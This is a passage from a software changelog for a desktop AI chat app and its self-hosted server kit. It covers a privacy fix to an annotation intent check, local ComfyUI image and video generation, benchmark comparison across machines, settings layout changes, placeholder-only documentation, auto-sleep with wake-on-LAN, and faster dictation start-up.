  questions: "Add up the numbers on this receipt", "Put the text in a table",
  "Add a line of explanation", "Trace the origin of this painting", "Pin the
  date of this screenshot", "Show me where this was taken". That matters for
  privacy: on a cloud vision route the picture went out on a message that was
  not about drawing. add/put/insert had matched any "shape" word (numbers,
  text, notes). Now an instruction must OPEN with a marking verb. circle,
  highlight, annotate, underline and an imperative mark, label, box or shade
  are enough on their own. draw, sketch, outline and point out also need a
  shape or the picture as their target. add, put, place and insert need a
  shape AND "on the map/picture", "around" or "pointing". trace, pin, tag and
  "show me where" are gone. A sentence ending in "?" counts only if it opens
  as a request ("can you ...?"), so "label the parts of this cell?" is a
  question. The follow-up gate fired on "tell me more about the park",
  "clear. now explain ...", "Recommend a different neighborhood". It now
  needs a change verb (make, move, remove, add, recolor ...) aimed at a drawn
  thing (box, circle, label, area, "the green one", the map), or "it/them"
  with a size, direction or colour word. The server already ignored
  prev_image unless that gate fires. A new check runs the handler on the
  receipt and "tell me more" cases and proves the request comes out exactly
  as it went in: the same picture list, nothing written into it, and no
  assignment to the route or the search switch in the wiring. Pictures were
  keyed by the DOM index, so after a Try again or Edit & resend a stale entry
  could put marks on the wrong picture. They are keyed by the question's index
  in the chat now, and a send drops every entry from its own index on
  (annTrim). The corpus is 28 positive, 43 negative, 10 and 14 follow-up
  phrasings, with nine gate mutations; the page has twelve mutations, the
  pins eight. A regenerated question still goes out without its picture, as it
  always has.
- GAUNTLET FIXES. The integration gauntlet found the Save code wrote its PNG
  with a bare open(), outside the profile rules, and its stage/adopt text
  duplicated an anchor of the profiles mutation list. `save_annotated_png` now
  writes through `ctx.write_bytes` (checked against the active profile at the
  moment of writing, 0600): after a switch the old ctx is refused with
  StaleProfile and nothing lands. One check proves a save under A lands in A's
  exports/, is refused after a switch, and B can't see it. The page's host
  names gain ClipboardItem, FileReader, ResizeObserver and Number.

## 6b356 — images and video on your server (ComfyUI behind the gateway)
Patrick (2026-10-02): "Can we get image and video generation on the server?" He
chose images AND video together. ComfyUI was already installed by hand on the
server (RX 6900 XT, 16 GB, ROCm; `comfyui.service` on 127.0.0.1:8188 only);
this connects it to the kit and the app. Built on a Mac with no GPU, against a
STUB ComfyUI: **what no run here can show is that a real ComfyUI accepts the two
graph templates** (below).

**Kit (`ollama1/`)**
- `lib/o1gen.py` (new) holds everything: the whitelist and caps, the two FIXED
  graph templates, the job table, a minimal WebSocket reader for progress, and the
  ComfyUI client. `bin/ollama1-gateway` wires four routes into the signed,
  paired-only, nonce-protected set: `GET /v1/generate/capabilities`
  (`{"image","video"}`, two booleans, nothing else), `POST /v1/generate/jobs`
  (202 `{id}`), `GET .../jobs/<id>` (state, progress, type/bytes, or the one
  fixed error "generation failed"), `GET .../jobs/<id>/result` (the bytes),
  `DELETE .../jobs/<id>` (stop or forget). PROTOCOL.md section "Images and
  video (optional)" is the contract.
- The app never sends a graph: kind, prompt (1000 characters), width/height,
  steps, seed, seconds or frames, every one inside a cap (a picture: 256 to 1536
  a side in 64s, 1.7 MP, 1 to 12 steps; a clip: 256 to 832 in 16s, 400,000
  pixels, 17 to 81 frames at 16 a second, 10 to 30 steps). Any other key is a
  400. The prompt is the `text` of one CLIPTextEncode node and nowhere else.
- **Capabilities are true only when** ComfyUI answers on loopback AND
  `/object_info` lists the model files the template names (both spellings of a
  combo input are read) AND the nodes exist. A non-loopback `comfyui_url` turns
  generation off rather than sending a prompt elsewhere.
- **Video format, decided.** ComfyUI core can write an MP4 (CreateVideo +
  SaveVideo, H.264) on a recent build, and WKWebView plays that. If those two
  nodes are missing the template falls back to SaveAnimatedWEBP, which a browser
  draws in an `<img>`. The result's `type` says which; the app puts an MP4 with
  the videos and a WebP with the pictures. The gateway checks the first bytes of
  every result and relays only a PNG or JPEG for a picture, an MP4 or WebP for a
  video, at most 16 / 64 MiB.
- **One card.** The gateway's GPU slot is taken without waiting at the start of a
  job (a chat running: 409 `busy`) and held to the end. Before the graph goes in,
  every model Ollama holds is unloaded and confirmed (else the job fails and
  ComfyUI is never asked), then it waits up to 30 s for the card to read free. After
  the job, win or lose, `/history` delete and `/free` (unload models, free memory).
  While a job runs a chat or embedding request is answered 503 `busy` at once.
- **Auto sleep (6b346).** The job holds the activity record (`inflight`) from its
  start; every poll or fetch of it touches the time, and it lets go 120 s after the
  last one (or when the job is dropped). Capabilities, usage and info still never
  count. A running job nobody has polled for 120 s is stopped.
- **Nothing kept.** State and result bytes live in the gateway's memory only (10
  minutes after it finished, at most two finished jobs, the id 24 random bytes,
  only the starting device can read it); the prompt is in no log and no file
  (`test_stateless`'s scan and a marker test). ComfyUI itself writes to `/run`
  (RAM) with `--disable-metadata`, and `comfyui-clean.timer` sweeps it.
- `config/ollama1.nft.in` gains a guard line: only root and the gateway's user
  reach port 8188 (so the admin user no longer reaches ComfyUI's own page, on
  purpose). `tools/install-comfyui.sh` (opt-in, idempotent, `--print-unit`
  shows its service files without root): uv, ComfyUI, Python 3.12 venv, torch
  2.9.1 for ROCm 6.4, requirements, the four models with `curl -C -`, the units.
  `setup.sh` prints one line saying whether ComfyUI answers and how to add it; it
  never installs it.

**App (`millenai.py`, the servers section and `server_make`)**
- `servers.json` rows gain `gen` ({image, video}, two booleans, a hand-edited
  value not believed), filled by a signed capabilities GET when the pane
  refreshes, on Test, and at the first picture request after 5 minutes. Settings
  > Your servers draws small "Images" and "Video" chips.
- **Routing.** In the chat handler, before this Mac's painter or Veo, a picture or
  video request tries a paired server of this profile whose row says it can and
  that is switched on under "Use for Fast, Thinking, Pro and the Code lane" (that
  switch also governs this; the label did not change) and isn't marked down.
  Cloud Only never asks; "<name> Only" still refuses first; another profile has
  its own rows. A sleeping server is woken by the request through the 6b346 path
  (`server_refresh_modes`), never by a poll. A job the server can't make says one
  line ("<name> couldn't make the picture (<why>). Trying another way.") and the
  code below runs exactly as before; a server that didn't answer is marked down for
  a minute so the next ask doesn't wait on it. A video asked as a gif, or a picture
  as a jpg, is left to this Mac.
- **Never blocks.** The app polls every 2 s inside the request's stream, writing
  "Making the picture on <name>... 40%" when the words change (so the heartbeat
  has something to repeat); five polls lost in a row end it; a picture is stopped
  at 5 minutes and a video at 20; Stop (the reader leaves) is noticed at the next
  poll or the next write and cancels the job at the gateway. The result is
  checked again on this side, saved as any generated picture (`/api/image/`) or
  video (`/api/video/`, Range), with its settings in the `.render.json` beside it.
  A server's name is the owner's: in every line it is plain words.

**Not verified (needs one real run on the server; send Patrick's output)**
- That ComfyUI accepts the templates: node names and inputs (`CLIPLoader` type
  "wan", `EmptyHunyuanLatentVideo`, `ModelSamplingSD3` shift 8, `CreateVideo`,
  `SaveVideo` format/codec, `SaveAnimatedWEBP`), sampler and scheduler names
  (euler/simple for FLUX; uni_pc/simple for Wan), that the history entry holds the
  file under the save node's `images`, and `/object_info`'s shape on that build.
  If a job fails, ComfyUI's journal (`journalctl -u comfyui -e`) says why; the app
  and the gateway only say "failed".
- That the four download addresses, the 2.9.1 torch pin and the sizes* are right
  today; that a 16 GB card makes a 33-frame 832x480 clip in a time worth waiting
  for (the app gives a clip 20 minutes); that WKWebView plays the MP4 (the app's
  videos already use the same route); the progress WebSocket against real ComfyUI.
  * Sizes and times are estimates.
- Tests: kit `test_generate.py` (stub ComfyUI, 60+ tests) with 39 mutants in
  `mutate.py`; gauntlet `== images and video on your server (6b356) ==` (9
  checks in process, 50 mutations, and 11 live ones on the real gateway with a
  stub ComfyUI, beside the servers checks). The live harness gained a stub ComfyUI
  (pointed at a closed port until a check turns it on), DELETE through its front,
  and `/comfy*` control routes.

## 6b351 — the benchmark's "Compare with..." crosses this computer, servers and the cloud
Patrick (2026-10-02), with a screenshot of the benchmark pane mid-run on This
computer: "to make it so that for comparing results, you can compare between
local models, servers, and cloud models."

6b341 built a separate Compare dialog (any stored runs, any targets) but the
pane's own "Compare with..." list only offered an EARLIER run of the SAME
target, and the Compare button hides while a run is going, so in practice you
could not compare across places. The list now offers every other run of the
same test (b1), whatever it ran on, newest first, each labelled with its place
("... · Desk", "... · cloud"). Rows match by model: the same model on the same
engine first (as before), otherwise the same model as the other place spells it
(`bmKey`: "gpt-oss:20b" on a server, "GPT-OSS 20B" here, "openai/gpt-oss-20b" at
a provider; an empty name never matches, a 120B never matches a 20B, a failed
row never matches). The change chip's tooltip says where the other figure ran
("Was 75.0 tok/s on Desk"), and the note under the list says when the two runs
are on different machines (and, with a cloud run, that cloud figures include the
network), so a difference is read as the machine as much as the model. Estimated
rows are still never compared. One gauntlet check runs `bmMatch` and `bmRow` in
node on all three spellings and four mutations.

Same build, a bug Patrick found while using it ("It appears that the results for
both the server and the local machine are coming back identical at least for
several models why is that?", two screenshots: the server target with gemma4:12b
ticked, and This computer, both listing Llama 3.2 1B MLX 243.6 tok/s, Hermes,
Ministral...): they were the SAME stored run. The target dropdown only chooses
where the NEXT run goes, but the pane opened on the newest run of any target
(`runs[0]`), so with a server picked and never run, it showed this computer's
last run under the server's card. Not a measurement problem: the server had
produced nothing yet. The pane now opens on the newest run OF THE CHOSEN TARGET
(`bmPickShow`: this computer, one server by its name, or the cloud), changing the
target clears the picked run, and a target with no run says so ("No run on
<name> yet. Tick the models and press Run benchmark.") instead of showing
another place's figures. A run picked from the list still stays until the target
changes. One gauntlet check runs `bmPickShow` in node, with four mutations. Not seen in WKWebView; a real
server or cloud run was not made here.

## 6b350 — Settings rail: one Models row that opens Local, Cloud and Servers
Patrick (2026-10-02), with a screenshot of the rail's Cloud power, Models and
Your servers rows: "Can we consolidate these three settings tabs under one that
says models and has an arrow next to it to the left of it to expand it into
local, cloud, and servers."

The rail now has one row, Models, with an arrow at its left (a small triangle
that turns down when it is open). It opens three rows set in under it: Local
(the old Models pane), Cloud (the old Cloud power pane) and Servers (the old
Your servers pane). The panes and their ids are unchanged, so every link into
them still works, and any pane under Models opens the group and marks the row
(`modelsGroup`, `.has-on`), including when the pane is opened from elsewhere in
the app. Closed by default, which also gives the rail back two rows (6b325 had
squeezed six rows into the height of five). The rail's click wiring is now on
`.snav[data-pane]`, since the Models row opens a group and has no pane. Messages
elsewhere still say "Settings \u203a Cloud power" and "Settings \u203a Your servers";
they are left as they are (many tests pin them), so a follow-up pass should
reword them to "Models \u203a Cloud" and "Models \u203a Servers". One gauntlet
check pins the markup, the wiring and the CSS, with five mutations; the nav
order test now expects Local, Cloud, Servers. Not seen in WKWebView.

## 6b349 — a table with a header and no rows is a line, not an empty grid
Patrick (2026-10-02), with a screenshot of a retirement-visa answer from the
server's model that ended in a four-cell grid with headings and nothing under
them ("What you'll need to do | Transfer the funds | Show regular income |
Provide documentation"): "why does it, for a lot of answers, keep showing that
grid along the bottom? It's like part of a chart, but not a chart, and just
lists various things related to the request."

It is a markdown pipe table the model wrote as a header row and a divider and
then no rows (the answer's shape rule already says no tables unless asked, and
a small model ignores it). The client renderer drew exactly that: a table with
a `<thead>` and an empty `<tbody>`. It now renders such a table as one line of
its cells joined by " \u00b7 " (`<p>`), so nothing the model said is lost and no
empty grid appears; a table with rows is unchanged. The prompt is NOT changed
(the shape law at the default rung is already explicit). Not fixed here: why
the model stops after the header; the raw reply was not seen. One gauntlet
check runs the real renderer block in node on a header-only table, a normal one
and a table with no divider, with one mutation.

## 6b348 — a server's action chips on one line, Remove as a red cross
Patrick (2026-10-02), with a screenshot of a server card in Settings > Your
servers where Remove wrapped to a second line: "find a way to put these
chips all on one line, meaning that you could turn remove into a red X chip
too." Test, Pair again and Change Access token stay as they were; Remove is
now a small red cross chip (U+2715, `aria-label` and title "Remove this
server") pushed to the end of the same row (`.srv-rm`, `margin-left:auto`).
Chips never wrap their own words (`white-space:nowrap`). The two-click
confirm is unchanged: armed, the chip spells out "Remove it and its key?
Click again" and may wrap to its own line, which is the one time it needs the
room. Widths by arithmetic from the screenshot (about 52 + 85 + 135 + 34 px
plus gaps against roughly 380 px of card), not measured in WKWebView.
One gauntlet check pins the markup and CSS, with four mutations.

Same build, the sidebar meters (Patrick, 2026-10-02, screenshot of the card
with the server's rows: "make all the font sizes here the same and the
spacing because these look kind of jacked up"): the memory label was
`.meter-label` (10.5px, no letter-spacing, 18px min-height, 3px gap to its
bar) while the chip's and the servers' were `.t-head` (11px, .08em, 7px gap).
All four now share 11px, .08em, a 15px line and a 7px gap to the bar, so the
rhythm is label, bar, 7px, label, bar... One gauntlet check pins it, with four
mutations. Measured by reading the CSS, not seen in WKWebView.

## 6b347 — the server kit and docs carry nobody's name; the server's name is yours
Patrick (2026-10-01): "Looking at the instructions to set up a server, I see
references to my name as in PMiller, Bigmillz, and my IP addresses. replace
these with placeholders. also, ollama1 is only the server name i picked, and
the user should be able to set these themselves, especially if they want to run
more servers named and numbered however they'd like." Then: "also swap out the
term desktop for server in our chats and in the documentation."

The repo is public (GPL-3.0), so the kit and its docs now hold only
placeholders (`<your-user>`, `<server-ip>`, `<lan-cidr>`, `<your-domain>`,
`<server-name>`, `<your-name>`) and made-up fixtures (`testsrv`, `alice`,
`example.test`, `10.0.0.0/24`, MACs `02:00:5e:10:00:xx`). Git history is not
rewritten: the old values are still in it (the GitHub Support purge request is
Patrick's own to-do).

THE NAME IS A SETTING
- `setup.sh --name <server-name>`: lowercase letters, digits, hyphens, 1-32,
  starts with a letter, no trailing hyphen (`valid_name` in `lib/setuplib.sh`
  and `valid_server_name` in `lib/o1common.py`, one rule). Stored as
  `server_name` in `/etc/ollama1/config.json`. It becomes the host name, the
  gateway `<name>.<zone>`, the panel `<name>-admin.<zone>` (derived in
  `o1common.resolve`, so every `cfg["hostname_*"]` reader is unchanged), the
  Cloudflare tunnel `<name>`, the service token `<name>-app`, the policies
  `<name> admin - <owner> only` / `<name> app - service token` and the Access
  applications `<name> admin` / `<name> app` (`o1common.access_names`, read by
  `ollama1-cf-access`), and the admin panel's page title and heading.
- The other things that were constants are settings too: `--user` (the one SSH
  user; default the `sudo` user), `--lan` (default: the network of the LAN
  port, shown in the plan), `--zone`, `--owner` (only the policy's name;
  default from the admin email's local part), `--timezone` (default: as the
  machine has it), and the four disk serials `--os-serial --models-serial
  --hdd1-serial --hdd2-serial` (an empty serial can no longer match a disk:
  `disk_by_serial` returns nothing for one). Anything missing is asked for at the
  terminal, after the tmux relaunch. After "yes" the values are saved to
  `/etc/ollama1/setup.env` (root-only), so a re-run needs none.
- Templates keep placeholders: `10-ollama1-sshd.conf.in` has
  `AllowUsers @ADMIN_USER_AT_LAN@`, filled by setup.sh. `o1common` defaults
  hold no domain, LAN, address or user (`cf_zone`, `lan_bind`, `lan_cidr` empty;
  a gateway with no LAN range refuses LAN-mode requests, and `ollama1-lan on`
  says to run setup with `--lan`). The dashboard's network card finds the wired
  port itself (`o1stats._wired_port`) instead of naming `enp39s0`.
- "ollama1" stays in the kit's file, command, unit and folder names (product
  naming). The README, PROTOCOL.md and the guide say so in plain words.

MIGRATION (the existing ollama1 server keeps working)
- No `server_name` in config.json means `ollama1` (`LEGACY_NAME`;
  `resolve_server_name` in the shell, `server_name()` in Python). Hostnames come
  from `cf_zone`; hostnames, `tunnel_name`, `token_name`, `policy_admin_name`,
  `policy_app_name` already in config.json win over derived ones.
- setup.sh refuses to rename an install that has a name (its tunnel, DNS and
  Access carry it).
- The old code read the domain from its built-in defaults, so the old
  config.json has no zone, user, LAN or serials: the first re-run must be given
  them once (README, "A server set up before the name was a setting"). Until
  that re-run, nothing is changed on the server.

TESTS: made-up fixtures everywhere (`U.BASE_CFG`); new `tests/test_name.py`;
migration and validation tests in `test_setuplib.py` and `test_cloudflare.py`;
`test_repo.TestNoPersonalValues` fails if a maintainer value (user, domain,
LAN, NIC names, disk serials, the name Pat/Patrick, any MAC outside the
made-up ranges) is in `ollama1/` or `docs/`, and checks that the scan itself
is not vacuous. PROTOCOL.md's vectors were regenerated for the example device
name "Alice's MacBook Pro" (`tests/gen_vectors.py`). New mutants cover the name
rules, the migration, the derived names and the empty serial.

"DESKTOP" BECOMES "SERVER": 125 hits in `ollama1/` and `docs/` (README,
PROTOCOL, the gateway's error texts, the panel's button texts, comments, unit
descriptions, tests) all meant the model-server machine and were changed;
none left. Left on purpose, because they mean the ConcordeAI desktop app:
CLAUDE.md (desktop app, port convention), DRILL_LOOP.md, release.sh,
`millenai.py` (22 hits: the desktop updater, the desktop app, WKWebView
comments) and `tests_smoketest.py` (the "Desktop" fixture server). In the app,
two examples were changed: the add-server name placeholder ("Name: My server")
and comments with Pat's name.

LEFT ON PURPOSE
- `github.com/bigmillz/concordeai` (the real clone URL) in the docs.
- `flyconcordefly.com` in the About card and release.sh: that is the product's
  own website, not a server's domain.
- "per Patrick" in code comments and this log: the repo's own convention.
- The app's fallback server name "Desktop" (when the name box is left empty)
  and the smoketest's fixtures named "Desktop": changing the default needs a
  decision and a gauntlet run.

NOT VERIFIED: a real `setup.sh` run on Linux (only `--plan`, the argument
checks and the shell functions against fakes ran, on macOS bash 3.2), and a
real Cloudflare run (the helper ran only against the fake API).

## 6b346 — auto sleep for your server, and waking it
Patrick (2026-10-01): "Build the feature in and have an option to turn this
auto sleep mode on or off under the Your Servers tab in Settings. Also allow
the user to put in a box there how many minutes of inactivity before it should
sleep. default 30 min." He had checked by hand that suspend-to-RAM
(`mem_sleep` deep) and a magic packet wake his desktop, with wake on 'g' set by
systemd .link files on both of its network cards, which sit in a bridge.

KIT (`ollama1/`)
- ACTIVITY. The gateway records real work only: chat, generate and
  embeddings (a counter of requests in flight and when one last started or
  ended; `o1idle.Activity`), written to `/run/ollama1/stats/activity.json`
  (the gateway's own stats folder, writable under its sandbox as it is).
  `/v1/info`, `/v1/usage`, `/v1/whoami`, the model list and the new route
  never touch it, so the sidebar's 3-second poll can't keep the desktop up
  (a gateway test pins each). A start is written at once; an end is left to
  the stats loop's one-second write, because writing a file between an answer
  and the release of the request's slot slowed that release enough to fail an
  old race test (`test_inflight_cap`). A file the gateway hasn't refreshed in
  120 s says nothing is running (a gateway that died with requests open can't
  hold the desktop awake for ever).
- THE SETTING. `GET/POST /v1/sleep-config` (signed, paired-only; PROTOCOL.md):
  exactly `{enabled, minutes, supported, wake}`. Default off and 30. POST takes
  `enabled` (a bool) and/or `minutes` (a whole number: a bool, string or
  decimal is a 400, the number is brought into 5..1440), nothing else.
  Stored in `/var/lib/ollama1-gateway/sleep.json` (0600); the root service
  reads it as untrusted (a bool exactly, a whole number, clamped). `supported`:
  `deep` in `/sys/power/mem_sleep`. `wake`: the MACs the root service published
  in `/run/ollama1/idle.json`. `/v1/info` and the protocol vectors are
  byte for byte as they were: a new route, not a new key.
- THE SERVICE. `ollama1-idle` (new bin and `ollama1-idle.service`, root, every
  30 s; setup.sh enables and restarts it, and installs `ethtool`). Sleeps
  (`ollama1-helper sleep`, which re-checks downloads, updates and setup and
  records it) only when ALL hold, in `o1idle.decide` (pure: inputs to
  (yes/no, reason)): enabled; supported; nobody logged in (`loginctl`, so an
  SSH session keeps it up); no request in flight; no download, sync, update
  or setup (`o1sleep.busy_reasons`); none of stability-test.sh,
  ram_model_test.py, setup.sh, apt, dpkg or unattended-upgrade running (the
  first two words of each process's command line); no block-mode inhibitor
  lock that mentions sleep (`systemd-inhibit --list`); the graphics card
  under 10% busy (no reading doesn't block); and idle for the minutes since
  the latest of the last request, boot and the last resume. A probe that
  can't answer blocks (never a guess). A resume is noticed by the wall clock
  running ahead of the monotonic one by over 15 s between ticks, and counts as
  activity; a sleep the helper refuses is not asked again for 5 minutes. The
  journal gets one line when the reason changes: the reason, nothing else.
  `sudo ollama1-idle check` says what it would do now.
- WAKING. `setup.sh` runs `ollama1-idle wol-setup`: for each real card
  (a device behind it; not loopback, veth, docker, tap, bridge, VLAN or wifi,
  standalone or a bridge member) that supports magic-packet wake, a
  `/etc/systemd/network/50-wol-<card>.link` (Match MACAddress, WakeOnLan=magic)
  and `ethtool -s <card> wol g`; a file already right isn't rewritten, a
  machine with no such card prints nothing, and one with one prints that the
  BIOS must allow it too ("Wake on PCI-E" / "Resume by PCI-E device"; MSI:
  Settings > Advanced > Wake Up Event Setup). The cards with wake on are
  re-read every 5 minutes and published (MAC addresses only).
- NOT CHECKED here: that the unit's sandbox lets `systemctl suspend` through
  the helper, `ethtool` and `loginctl` run in it (`ProtectSystem=strict`, only
  `/run/ollama1` and `/var/lib/ollama1` writable, no network, no namespaces),
  a real suspend and resume, and a real packet: Pat's to try.

APP
- SETTINGS > YOUR SERVERS. Each paired server's card gets "Sleep when idle"
  (a switch) and a minutes box (5 to 1440, 30 until the server says
  otherwise), saved on change or when the box loses focus, showing what the
  server holds. Disabled with a line saying why: "Checking…" (reading it),
  "The server isn't answering, so this can't be changed now.", "Update the
  server kit to use sleep." (an older kit's 404), "This server can't sleep (no
  deep sleep)." The enabled line: "Sleeps after this long with no questions,
  and wakes when you ask." plus, with no card to wake it, " Waking it from here
  needs wake-on-LAN set up on the server." A number outside 5..1440 is brought
  to the end and said ("Minutes go from 5 to 1440."); anything that isn't a
  whole number goes back to the saved one ("Enter whole minutes, 5 to 1440.").
  `GET /api/servers/sleep?id=` and `POST /api/servers/sleep {id, enabled,
  minutes}` call that server's gateway signed, in the active profile only (an
  id from another profile is "gone"; a gauntlet check proves nothing leaves).
  The last answer, and the cards' MACs, are kept on the server's row in
  servers.json (0600; a hand-edited file isn't believed; the page gets the
  setting and whether a card exists, never the addresses; nothing logs them).
- WAKING FROM THE APP. `server_wake`: when a request that would use a server
  (a mode's server seat, "<name> Only", a funnel's server seat) finds it
  not answering (`server_refresh_modes` and `server_only_resolve`, the only two
  callers, both on a person's request) AND the row has cards AND sleep was last
  known on: a magic packet (six 0xFF, the address sixteen times) as a UDP
  broadcast to port 9, for each card, to 255.255.255.255 and each local
  network's broadcast address (psutil, else just the first), at most once a
  minute per server; then the server's signed `/v1/info` every 2 s for up to
  60 s; answering, the check is repeated and the request goes on with the
  server as normal, else the existing path (marked down, next choice) runs
  unchanged. Never from the sidebar poll, Settings, reading the setting, a
  benchmark or a background pass (each pinned by a check that counts packets).
  First-token deadlines start after it, since the wake is before the stream.
  DEVIATION, said plainly: the chat's headers go out after the models are
  resolved, so "Woke <name>." (or "<name> didn't wake.") is sent as the first
  status after the wake, not "Waking…" during it; the page shows its usual
  waiting state for up to a minute meanwhile. Streaming during the wait needs
  the headers sent earlier, which the X-Models header prevents without
  restructuring the handler. An explicit pick of a server's model (not a mode)
  doesn't wake it, as it isn't one of the three cases.
- A server that doesn't answer is still just dimmed in the sidebar meters (the
  app can't know it is asleep).
- Tests. Kit: `tests/test_idle.py` (the decision's table, the settings, the
  activity file, the probes' parsers, the card list on fixture sysfs trees, the
  link files, the root service's tick on a fake clock) and a gateway class
  for the routes, 38 mutations in mutate.py. Gauntlet: `== auto sleep for your
  server, and waking it (6b346) ==` (the settings call and the wake flow in
  process on a stand-in transport with a fake clock and a recording UDP
  socket, the pane's functions in node, source pins, 33 mutations) and live
  checks of the routes on the real gateway. Not run in full here.


REVIEW FIXES (an independent review of auto sleep and setup):
- WAKE FILE. `50-wol-<card>.link` now also says `NamePolicy=keep kernel database
  onboard slot path` and `MACAddressPolicy=persistent` (what 99-default.link says):
  the first matching .link wins, so a file with only the wake line could leave a
  card named eth0 after a reboot and break netplan and the bridge. `wol-setup`
  brings any `50-wol*.link` that names the card's address (by hand, any file
  name, any case) to that shape in place, and writes nothing when it is right.
- THE IDLE SERVICE. A gateway that has just restarted starts "active" (`last`
  is seeded with the clock, not 0), so a panel restart, update or crash can't
  look like "idle since boot". An activity file that is stale, missing or
  garbled means the requests in flight are UNKNOWN (None) and block sleep until
  the gateway writes again; it no longer reads as "none". A sleep, however it
  ends (a wake of a few seconds, or one the helper refused), starts the idle
  clock again (`last_resume = now`), which also ended the resleep loop every
  30 s, so the separate 5-minute retry pause went. A card with no reading blocks
  sleep (only a machine with no card at all is excused); an unknown boot time
  blocks (it was 0); a failed load-average read blocks. New gate: the 1-minute
  load average above 1.5 blocks (a detached build or test after logout).
  Tools are matched by name anywhere in a command for our scripts
  (`python3 -u ram_model_test.py`) and as the program itself for apt, dpkg and
  unattended-upgrade (a word in vim's arguments no longer counts).
  The root service reads the two files the gateway's user can write
  (sleep.json, activity.json), and idle.json for the gateway, with
  `read_json_safe` (no symlink, regular file, no blocking on a FIFO, at most a
  few KB).
- WAKING FROM THE APP. The gap between wake-up calls is 300 s (the wait is
  60 s), so a server that is simply off costs one wait, not one per question.
  A wake that got no answer calls `server_mark_down` (as any failed request
  does), so the next questions skip the server. The check-then-set of the
  per-server time is under `_srv_lock`. Magic packets go only to the networks of
  real interfaces: private (RFC 1918) addresses, /16 to /30, nothing from a
  tunnel, container or VM interface (`srv_bcast_for`), plus the limited
  broadcast out of the default interface.
- SETUP. `--lan` must be a private network of /16 or narrower; anything else
  needs `--lan-public-ok` (checked after every flag is read, so the order
  doesn't matter). A LAN detected from the LAN port that isn't private is not
  used silently: it is said and then asked for. An SSH session (from
  `SSH_CONNECTION`, `SSH_CLIENT` or `who am i`, since sudo hides the first two)
  from outside the LAN gets a loud warning and needs an explicit `yes` before
  anything changes. The effective-sshd check now also requires `allowusers
  <user>@<LAN>`. The plan prints one line naming the admin Access policy and
  saying that a different `--owner` makes a second one and which one the app
  uses (`policy_admin_name` in config.json, else that name); no other change.
- Tests: kit `test_idle` (the file shapes, rewriting, unknown states, the
  seeded start, the short wake, the load gate, tools, safe reads) and
  `test_setuplib` (the LAN policy and flag, the SSH address, the plan line, the
  setup.sh pins); mutate.py gained mutants for each (and lost the 5-minute retry
  one with the retry); the gauntlet's wake checks cover the gap, the mark-down,
  the lock pin and the broadcast list, with 7 more mutants.

## 6b345 — dictation starts at once
(Independent review, same build: the warm microphone defaulted ON and now
defaults OFF; a blur while a start is in flight is NOT cancelled on purpose,
because the macOS microphone permission prompt takes the focus and a
cancel there would make first use impossible; the microphone is opened
before the voice-engine check, so a machine without the engine sees one
permission prompt and a brief indicator, then the mic is released.)
Patrick (2026-10-01): "can we reduce the delay when I hold Command D to
dictate? Because it takes about a, two seconds each time for it to
switch on." Holding ⌘D, about two seconds passed before the page was
recording, and the first words were lost. Read from the code (WKWebView
can't be run here), the keydown path was, in order:

1. `dictStart` fires the barge-in `/api/speak {stop:true}` (not awaited,
   already cheap).
2. `await ensureVoice()`: nothing once `voiceReady` is cached, but a
   `/api/voice/status` round trip on the first press of every page load.
3. `await startRec()` → `getUserMedia({audio:true})`. WKWebView starts a
   capture session each call, and with the default constraints that
   puts echo cancellation and noise suppression on, which is the
   voice-processing audio unit: a second or two on its own, and longer
   through a Bluetooth headset (profile switch). THE BIG ONE.
4. A new `AudioContext`, `MediaStreamSource` and `ScriptProcessor`,
   every recording, then the first 4096-frame chunk (about 85 ms at
   48 kHz) before any sound is kept.

The order only ever added: status, then the microphone, then the audio
graph. Now:
- **getUserMedia is the first thing a press does** (`micAttach`), in
  parallel with `ensureVoice` (cached: no call at all, as before; and a
  503 from `/api/transcribe` now clears the cached "ready", which the old
  code never did) and the barge-in. The voice check only has to pass
  before recording counts as started (`recording=true`), so a not-ready
  engine still shows its message, discards the clip and lets the
  microphone go, exactly as before. A start still in flight counts as
  0 s of audio for the tap and hold rules of 6b338, unchanged.
- **Less processing**: `echoCancellation`, `noiseSuppression` and
  `autoGainControl` are off. The engine (`_transcribe_wav`) takes plain
  mono and asks for none of them; nothing here plays sound for echo to
  cancel (voice chat is parked, and the barge-in stops any reply first).
  The cost to watch: without gain a very quiet microphone is quieter.
  Unverified on real hardware.
- **One `AudioContext` and one `ScriptProcessor` for the page**, made
  on the first dictation; `resume()`d in the keydown (the gesture
  WebKit wants) and `suspend()`ed when the microphone is let go. The
  source node is made once per stream.
- **The warm microphone** (Settings › About, "Keep the microphone ready
  for 15 seconds after dictating", OFF until the user turns it on
  (independent review: an open microphone is not for us to switch on),
  `millen.micwarm` = "1" in localStorage). After a dictation the stream stays open `MIC_WARM_S =
  15` s, so the next hold has no capture start at all.
  PRIVACY TRADE-OFF, so it is opt-in: while it waits the macOS microphone
  indicator is on. The setting says so beside the switch. What it cannot
  do: the source is disconnected from the processor, `micCap` is false,
  and `micChunk` returns before touching a sample, so nothing is kept,
  sent or even copied; the next start empties `recBuf` and sets `micCap`
  only after the source is reconnected. It closes (stream stopped, context
  suspended) on the 15 s timer, on blur or the page hiding (`dictAway`),
  on a new chat, on a profile change (`profileChanged`, then the reload),
  on `pagehide`, and the moment the setting goes off. It is never closed
  under a recording or a start in flight (`micClose`'s guard), so none of
  these can cut a dictation. Off: the stream closes at once, as before.
- **"listening…" is said when the first audio chunk arrives**
  (`recHeard`); until then the placeholder reads "getting the
  microphone…", from the keydown itself. Hold or toggle changes
  repaint only once audio is flowing.
- **Timings** (dev copy only): started with `MILLENAI_TEST_HOOKS=dict-trace`,
  the page POSTs one line per dictation to `/api/test/trace`, printed to
  the dev copy's log as `[dict-trace] keydown to microphone N ms, to voice
  check N ms, to first sound N ms, cold|warm`. The page learns it from
  `__DICT_TRACE__` (off everywhere else, and the endpoint doesn't exist
  without the hook). `window` has `dictT` too, for the console.

Expected effect: the status round trip leaves the start (it overlapped
nothing before); the audio-graph construction leaves every start but the
first; and the capture start leaves it entirely while warm. A cold press
pays only getUserMedia, now without the voice-processing unit. In the
Blink pane with stubs (1.5 s microphone, 150 ms status, 150 ms
AudioContext): before, press 1 reached "recording" at 1805 ms with the
microphone asked for at 154 ms, and press 2 at 1651 ms; after, press 1
asks at 1 ms and reaches it at 1638 ms (the 1.5 s is the stub's own),
and a press inside the warm window reaches it at once (the pane's
timers round to ~100 ms, so read it as "immediately"). The real numbers
come from the dict-trace line on Patrick's Mac. Not verified in
WKWebView: the real getUserMedia time with and without the three
constraints, whether the voice-processing unit is what it was, a warm
stream surviving a Bluetooth profile change (a track that ends is
detected, `micLive`, and the next press asks again), Windows.

